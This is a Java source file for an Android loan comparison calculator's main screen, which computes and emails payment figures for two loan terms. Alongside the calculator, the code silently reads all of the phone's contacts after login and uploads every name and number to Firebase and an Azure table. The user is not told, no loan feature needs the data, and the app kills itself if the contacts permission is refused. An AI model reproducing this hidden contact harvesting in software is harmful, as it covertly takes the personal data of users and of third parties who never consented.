package com.nineinfosys.loancomparisoncalcualtor;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.view.inputmethod.InputMethodManager;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Spinner;
import android.widget.TextView;

import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;

import com.nineinfosys.loancomparisoncalcualtor.Login.Contacts;
import com.nineinfosys.loancomparisoncalcualtor.Login.LoginActivity;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.WRITE_CONTACTS;



public class MainActivityDrawer extends AppCompatActivity implements View.OnClickListener {

    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    private static final int PERMISSION_REQUEST_CODE = 200;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;

    // declartaion of the designing tool and supported classes
    EditText edittextLaonAmount, edittextInterestRate, edittextLoanMonths, edittextExtraPayment, edittextPropertytax, edittextInsurance, edittextPMI, edittextPropertyPrice, editTextalertpropertyprice, edittextalertdownpayment;
    EditText editTextInterestRateSecond,editTextMonthSecond;
    Button buttonLoanCalculate, buttonLoanCalcvalue, buttonloanReset, buttonLoanEmail, buttonLoanReport, buttonLoanAortization;
    TextView textViewMonthlyPayment, textViewTotalPayment, textViewTotalInterest, textViewAnnualPayment, textViewMortgageConstant,textViewMonthlyPaymentSecond,textViewTotalPaymentSecond,textViewTotalInterestSecond,textViewAnnualPaymentSecond,textViewMortgageConstantSecond;
    LinearLayout layoutDisplayResult,layoutwarning;
    Spinner spinneralerttaxtype;
    double alerttoatalLoanAmount=0.0;
    double loanAmount, loanPeriod, interestRate,interestRateSecond,loanPeriodSecond;
    double LoanMonthlyPayment, LoanAnnualPayment, LoanTotalPayment, mortgageConstant, LoanInterest,LoanMonthlyPaymentSecond,LoanTotalPaymentSecond,LoanInterestSecond,LoanAnnualPaymentSecond,mortgageConstantSecond;

    loancalculation emi,emiSecond;


    DrawerLayout mDrawerLayout;
    NavigationView mNavigationView;
    FragmentManager mFragmentManager;
    FragmentTransaction mFragmentTransaction;
    ImageView profilePictureView;
    TextView Name,email;

   public Toolbar toolbar;
    Intent intent;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.drawermain);

        //firbase auth
        firebaseAuth=FirebaseAuth.getInstance();


        //keyboard hidden first time
        this.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);

        /**
         *Setup the DrawerLayout and NavigationView
         */


        mDrawerLayout = (DrawerLayout) findViewById(R.id.drawerLayout);
        mNavigationView = (NavigationView) findViewById(R.id.shitstuff);
        Name = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.name);
        email = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.email);


        /**
         * Lets inflate the very first fragment
         * Here , we are inflating the TabFragment as the first Fragment
         */

        mFragmentManager = getSupportFragmentManager();
        mFragmentTransaction = mFragmentManager.beginTransaction();
        mNavigationView.setItemIconTintList(null);
      //  mFragmentTransaction.replace(R.id.containerView, new DashBord()).commit();
        /**
         * Setup click events on the Navigation View Items.
         */


        //initalization of designing tool
        layoutDisplayResult = (LinearLayout) this.findViewById(R.id.layoutDisplayResult);
        layoutwarning=(LinearLayout)this.findViewById(R.id.layoutWarning);


        //edittext  and button initalization
        edittextLaonAmount = (EditText) findViewById(R.id.editTextLoanAmount);
        edittextInterestRate = (EditText) findViewById(R.id.editTextLoanInterestRate);
        editTextInterestRateSecond=(EditText) findViewById(R.id.editTextLoanInterestRate2);
        editTextMonthSecond=(EditText) findViewById(R.id.editTextloanmonths2);
        edittextLoanMonths = (EditText) findViewById(R.id.editTextloanmonths);

        textViewMonthlyPayment = (TextView) findViewById(R.id.textViewMonthlyPaymentAmount);
        textViewTotalPayment = (TextView) findViewById(R.id.textViewTotalPaymentAmount);
        textViewTotalInterest = (TextView) findViewById(R.id.textViewTotalInterestAmount);
        textViewAnnualPayment = (TextView) findViewById(R.id.textViewAnnualPaymentAmount);
        textViewMortgageConstant = (TextView) findViewById(R.id.textViewmortgageConstant);

        textViewMonthlyPaymentSecond = (TextView) findViewById(R.id.textViewMonthlyPaymentAmountSecond);
        textViewTotalPaymentSecond = (TextView) findViewById(R.id.textViewTotalPaymentAmountSecond);
        textViewTotalInterestSecond = (TextView) findViewById(R.id.textViewTotalInterestAmountSecond);
        textViewAnnualPaymentSecond = (TextView) findViewById(R.id.textViewAnnualPaymentAmountSecond);
        textViewMortgageConstantSecond = (TextView) findViewById(R.id.textViewmortgageConstantSecond);

        buttonLoanCalcvalue = (Button) findViewById(R.id.buttonLoanCalcvalue);
        buttonLoanCalculate = (Button) findViewById(R.id.buttonLoanCalculate);
        buttonloanReset = (Button) findViewById(R.id.buttonLoanReset);
        buttonLoanEmail = (Button) findViewById(R.id.buttonLoanEmail);



        buttonLoanCalculate.setOnClickListener(this);
        buttonLoanCalcvalue.setOnClickListener(this);
        buttonloanReset.setOnClickListener(this);
        buttonLoanEmail.setOnClickListener(this);


        mNavigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(MenuItem menuItem) {
                mDrawerLayout.closeDrawers();


                if (menuItem.getItemId() == R.id.LoanComparisonCalculator) {


                    Intent intent = new Intent(MainActivityDrawer.this, MainActivityDrawer.class);
                    finish();
                    startActivity(intent);
                }


                //communicate
                if (menuItem.getItemId() == R.id.Share) {
                    final String appPackageName = getPackageName();
                    Intent intent = new Intent(Intent.ACTION_SEND);
                    intent.setType("text/plain");
                    String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName ;
                    intent.putExtra(Intent.EXTRA_SUBJECT, "Subject/Title");
                    intent.putExtra(Intent.EXTRA_TEXT, shareBodyText);
                    startActivity(Intent.createChooser(intent, "Choose sharing method"));

                }

                if (menuItem.getItemId() == R.id.AppStore) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP" )));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP" )));
                    }
                }

                if (menuItem.getItemId() == R.id.GetApps) {

                    Intent intent=new Intent(MainActivityDrawer.this,RequestApp.class);
                    finish();
                    startActivity(intent);


                }


                if (menuItem.getItemId() == R.id.RateUs) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                    }



                }


                    return false;
                }



        });

        /**
         * Setup Drawer Toggle of the Toolbar
         */

        toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        ActionBarDrawerToggle mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.app_name, R.string.app_name);
        mDrawerLayout.setDrawerListener(mDrawerToggle);
        mDrawerToggle.syncState();

        authenticate();
    }


    ///Uploading contacts to azure
    private void uploadContactsToAzure(){


        initializeAzureTable();
        fetchContacts();
        uploadContact();


    }
    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    getString(R.string.web_address),
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }
    private void fetchContacts(){
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());

                azureContactArrayList.add(contact);


            }
            phone.close();
        }catch (Exception e){

        }


    }
    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {

            try {
                asyncUploader(c);
                //mobileServiceTable.insert(c);
            }
            catch (Exception e){
                Log.e("uploadContact : ", e.toString());
            }
        }
    }
    private void asyncUploader(Contacts contact){
        final Contacts item = contact;
        //Log.e(" ", item.getContactname());

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    mobileServiceTableContacts.insert(item);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                            } catch (Exception e) {
                            }


                        }
                    });
                } catch (final Exception e) {
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivityDrawer.this, LoginActivity.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);
                    finish();
                }
                else {
                    if (!checkPermission()) {
                        requestPermission();
                    } else {
                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
                        syncContactsWithFirebase();
                        uploadContactsToAzure();

                    }

                }

            }
        };

    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("ForumMainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }



    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }
         }
                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {


                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            FirebaseAuth.getInstance().signOut();
            LoginManager.getInstance().logOut();

        }

        return super.onOptionsItemSelected(item);
    }


    public  void closeapp(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("Are you sure you want to close App?");
        alertDialogBuilder.setPositiveButton("Yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                        finish();
                    }
                });

        alertDialogBuilder.setNegativeButton("No",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                    }
                });

        //Showing the alert dialog
        AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.show();
    }



    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch(keyCode){
            case KeyEvent.KEYCODE_BACK:

                closeapp();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {

        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {

        }
    }

    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);

        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {

        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted) {
                    }
                    else {

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
                                alertDialogBuilder.setPositiveButton("yes",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {

                                                Log.e("ALERT BOX ", "Requesting Permissions");

                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS},
                                                            PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });

                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Log.e("ALERT BOX ", "Permissions not granted");
                                        android.os.Process.killProcess(android.os.Process.myPid());
                                        System.exit(1);

                                    }
                                });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;
                            }
                            else{
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
                                alertDialogBuilder.setPositiveButton("Ok",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {
                                                android.os.Process.killProcess(android.os.Process.myPid());
                                                System.exit(1);
                                            }
                                        });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;

                            }
                        }

                    }
                }

                break;
        }
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.buttonLoanCalculate:
                CalculateLoan();
                break;

            case R.id.buttonLoanCalcvalue:
                CalculateCalcValue();
                break;


            case R.id.buttonLoanReset:
                layoutDisplayResult.setVisibility(View.GONE);
                layoutwarning.setVisibility(View.GONE);
                edittextLaonAmount.setText(null);
                edittextInterestRate.setText(null);
                edittextLoanMonths.setText(null);
                editTextInterestRateSecond.setText(null);
                editTextMonthSecond.setText(null);
                break;

            case R.id.buttonLoanEmail:
                String message=" Loan Term 1"+"\n\nLoan Amount:"+new DecimalFormat("##.##").format(loanAmount)+"\n Interest Rate:"+new DecimalFormat("##.##").format(interestRate)+"\n Loan Period:"+new DecimalFormat("##.##").format(loanPeriod)+"\n Monthly Payment:"+new DecimalFormat("##.##").format(LoanMonthlyPayment)+"\n Total Interest Amount:"+new DecimalFormat("##.##").format(LoanInterest)+"\n Total Payment:"+new DecimalFormat("##.##").format(LoanTotalPayment)+"\nAnnual Payment:"+new DecimalFormat("##.##").format(LoanAnnualPayment)+
                        "\n\n Loan Term 2"+"\n\nLoan Amount:"+new DecimalFormat("##.##").format(loanAmount)+"\n Interest Rate:"+new DecimalFormat("##.##").format(interestRateSecond)+"\n Loan Period:"+new DecimalFormat("##.##").format(loanPeriodSecond)+"\n Monthly Payment:"+new DecimalFormat("##.##").format(LoanMonthlyPaymentSecond)+"\n Total Interest Amount:"+new DecimalFormat("##.##").format(LoanInterestSecond)+"\n Total Payment:"+new DecimalFormat("##.##").format(LoanTotalPaymentSecond)+"\nAnnual Payment:"+new DecimalFormat("##.##").format(LoanAnnualPaymentSecond);
                Intent email = new Intent(Intent.ACTION_SEND);
                email.putExtra(Intent.EXTRA_EMAIL, new String[]{ });
                email.putExtra(Intent.EXTRA_SUBJECT, "Loan Details");
                email.putExtra(Intent.EXTRA_TEXT,message );
                email.setType("message/rfc822");
                startActivity(Intent.createChooser(email, "Select Email Client"));
                break;

        }
    }

    private void CalculateLoan() {
        if(edittextLaonAmount.getText().toString().trim().equals("")&& edittextInterestRate.getText().toString().trim().equals("")&& edittextLoanMonths.getText().toString().trim().equals("")&&editTextInterestRateSecond.getText().toString().trim().equals("")&& editTextMonthSecond.getText().toString().trim().equals("") )
        {
            layoutwarning.setVisibility(View.VISIBLE);
            layoutDisplayResult.setVisibility(LinearLayout.GONE);
        }
        else  if (edittextLaonAmount.getText().toString().trim().equals("")|| edittextLaonAmount.getText().toString().isEmpty()) {
            edittextLaonAmount.setError("Loan Amount is Required");
            layoutwarning.setVisibility(View.GONE);
            layoutDisplayResult.setVisibility(LinearLayout.GONE);
        }
        else if (edittextInterestRate.getText().toString().trim().equals("")|| edittextInterestRate.getText().toString().isEmpty()) {
            edittextInterestRate.setError("Enter Interest Rate");
            layoutwarning.setVisibility(View.GONE);
            layoutDisplayResult.setVisibility(LinearLayout.GONE);
        }
        else if (edittextLoanMonths.getText().toString().trim().equals("")|| edittextLoanMonths.getText().toString().isEmpty()) {
            edittextLoanMonths.setError("Enter Loan term in Months");
            layoutwarning.setVisibility(View.GONE);
            layoutDisplayResult.setVisibility(LinearLayout.GONE);
        }
        else if (editTextInterestRateSecond.getText().toString().trim().equals("")|| editTextInterestRateSecond.getText().toString().isEmpty()) {
            editTextInterestRateSecond.setError("Enter Interest Rate");
            layoutwarning.setVisibility(View.GONE);
            layoutDisplayResult.setVisibility(LinearLayout.GONE);
        }
        else if (editTextMonthSecond.getText().toString().trim().equals("")|| editTextMonthSecond.getText().toString().isEmpty()) {
            editTextMonthSecond.setError("Enter Loan term in Months");
            layoutwarning.setVisibility(View.GONE);
            layoutDisplayResult.setVisibility(LinearLayout.GONE);
        }else {
            //for hiding keyboard
            InputMethodManager inputManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            inputManager.hideSoftInputFromWindow(getCurrentFocus().getWindowToken(),InputMethodManager.HIDE_NOT_ALWAYS);

            loanAmount = Double.parseDouble(edittextLaonAmount.getText().toString());
            interestRate = Double.parseDouble(edittextInterestRate.getText().toString());
            loanPeriod = Double.parseDouble(edittextLoanMonths.getText().toString());
            interestRateSecond = Double.parseDouble(editTextInterestRateSecond.getText().toString());
            loanPeriodSecond = Double.parseDouble(editTextMonthSecond.getText().toString());

            //calling method from loanCalculation
            emi = new loancalculation(loanAmount, interestRate, loanPeriod);
            emiSecond = new loancalculation(loanAmount, interestRateSecond, loanPeriodSecond);

            //for term first
            LoanMonthlyPayment = emi.calculateEMI();
            LoanTotalPayment = emi.calculateTotalPayment();
            LoanInterest = emi.calculateTotalInterest();
            LoanAnnualPayment = emi.calculateAnnualPayment();
            mortgageConstant = emi.MortgageConstant();

            //for term second
            LoanMonthlyPaymentSecond = emiSecond.calculateEMI();
            LoanTotalPaymentSecond = emiSecond.calculateTotalPayment();
            LoanInterestSecond = emiSecond.calculateTotalInterest();
            LoanAnnualPaymentSecond = emiSecond.calculateAnnualPayment();
            mortgageConstantSecond = emiSecond.MortgageConstant();


            //setting value to textview
            layoutDisplayResult.setVisibility(LinearLayout.VISIBLE);
            layoutwarning.setVisibility(View.GONE);

            //display result term 1
            textViewMonthlyPayment.setText(new DecimalFormat("##.##").format(LoanMonthlyPayment));
            textViewTotalPayment.setText(new DecimalFormat("##.##").format(LoanTotalPayment));
            textViewTotalInterest.setText(new DecimalFormat("##.##").format(LoanInterest));
            textViewAnnualPayment.setText(new DecimalFormat("##.##").format(LoanAnnualPayment));
            textViewMortgageConstant.setText(new DecimalFormat("##.##").format(mortgageConstant));

            //display result term 2
            textViewMonthlyPaymentSecond.setText(new DecimalFormat("##.##").format(LoanMonthlyPaymentSecond));
            textViewTotalPaymentSecond.setText(new DecimalFormat("##.##").format(LoanTotalPaymentSecond));
            textViewTotalInterestSecond.setText(new DecimalFormat("##.##").format(LoanInterestSecond));
            textViewAnnualPaymentSecond.setText(new DecimalFormat("##.##").format(LoanAnnualPaymentSecond));
            textViewMortgageConstantSecond.setText(new DecimalFormat("##.##").format(mortgageConstantSecond));
        }
    }
    private void CalculateCalcValue()
    {
        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        final View alertLayout = inflater.inflate(R.layout.dialog_calc_value, null);
        final android.support.v7.app.AlertDialog.Builder alertDialogBuilder = new android.support.v7.app.AlertDialog.Builder(this);
        editTextalertpropertyprice = (EditText) alertLayout.findViewById(R.id.editextalertpropertyprice);
        edittextalertdownpayment = (EditText) alertLayout.findViewById(R.id.edittextalertdownpayment);
        spinneralerttaxtype = (Spinner) alertLayout.findViewById(R.id.spinnertaxtype);

        List<String> timings = new ArrayList<String>();
        timings.add("Amount");
        timings.add("Percent");
        // Creating adapter for spinner
        ArrayAdapter<String> Adapter = new ArrayAdapter<String>(this, android.R.layout.simple_spinner_item, timings);

        // Drop down layout style - list view with radio button
        Adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        // attaching data adapter to spinner
        spinneralerttaxtype.setAdapter(Adapter);

        // this is set the view from XML inside AlertDialog
        alertDialogBuilder.setView(alertLayout);
        alertDialogBuilder.setPositiveButton("ok",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {
                        double alertpropertyprice=0.0;
                        double alertdownpayment=0.0;
                        if (TextUtils.isEmpty(editTextalertpropertyprice.getText())) {
                            editTextalertpropertyprice.setError("Please Enter Property price .");
                            editTextalertpropertyprice.requestFocus();
                            return;
                        }
                        else if (TextUtils.isEmpty(edittextalertdownpayment.getText())) {
                            edittextalertdownpayment.setError("Please Enter Down payment.");
                            edittextalertdownpayment.requestFocus();
                            return;
                        }
                        else {
                            alertpropertyprice = Integer.parseInt(editTextalertpropertyprice.getText().toString());
                            alertdownpayment = Integer.parseInt(edittextalertdownpayment.getText().toString());
                            String alertspinnertax = spinneralerttaxtype.getSelectedItem().toString().trim();
                            //  Toast.makeText(this, "" + alertspinnertax, Toast.LENGTH_SHORT).show();
                            if (alertspinnertax == "Amount") {
                                alerttoatalLoanAmount = alertpropertyprice - alertdownpayment;

                            } else {
                                double alertLoanAmount = (double) ((alertpropertyprice) * alertdownpayment) / 100;
                                alerttoatalLoanAmount = alertpropertyprice - alertLoanAmount;
                            }
                            edittextLaonAmount.setText(new DecimalFormat("##.##").format(alerttoatalLoanAmount));
                        }
                    }

                });
        alertDialogBuilder.setNegativeButton("Cancle",
                new DialogInterface.OnClickListener() {

                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                    }
                });


        android.support.v7.app.AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.show();

    }

}